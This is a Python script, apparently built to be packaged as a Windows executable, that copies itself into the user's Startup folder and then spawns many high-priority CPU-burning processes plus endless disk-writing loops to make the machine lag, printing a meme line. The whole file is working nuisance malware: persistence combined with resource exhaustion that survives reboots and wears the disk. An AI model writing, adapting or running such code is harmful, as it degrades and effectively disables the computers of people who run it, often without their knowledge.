import multiprocessing
import os
import hashlib
import psutil 
import sys
import shutil
import time

# =====================
# File Path Fix (For EXE)
# =====================
def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# =====================
# Startup Persistence
# =====================
def add_to_startup():
    startup_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    current_file = os.path.abspath(sys.argv[0])
    
    if os.path.exists(current_file):
        destination = os.path.join(startup_path, os.path.basename(current_file))
        if not os.path.exists(destination):
            try:
                shutil.copy2(current_file, destination)
            except Exception as e:
                print(f"Error: {e}")

# =====================
# Lag Workers
# =====================
def extreme_worker(worker_id):
    p = psutil.Process(os.getpid())
    try:
        p.nice(psutil.HIGH_PRIORITY_CLASS)
    except:
        pass 

    data = b"\x01" * 1024
    while True:
        hashlib.md5(data).hexdigest()

def aggressive_disk(worker_id):
    path = f"stress_test_{worker_id}.tmp"
    while True:
        try:
            with open(path, "wb") as f:
                f.write(os.urandom(1024 * 1024 * 10)) 
                f.flush()
                os.fsync(f.fileno()) 
            os.remove(path)
        except:
            pass

# =====================
# Main Execution (EXE Compatible)
# =====================
if __name__ == "__main__":
    # MANDATORY for EXE compatibility to prevent infinite process loops
    multiprocessing.freeze_support()

    # Run startup logic
    add_to_startup()

    print("Tung Tung Tung Sahur")
    
    # Start CPU Workers
    for i in range(multiprocessing.cpu_count() * 3):
        multiprocessing.Process(target=extreme_worker, args=(i,)).start()

    # Start Disk Workers
    for i in range(2):
        multiprocessing.Process(target=aggressive_disk, args=(i,)).start()

    # Keep main alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
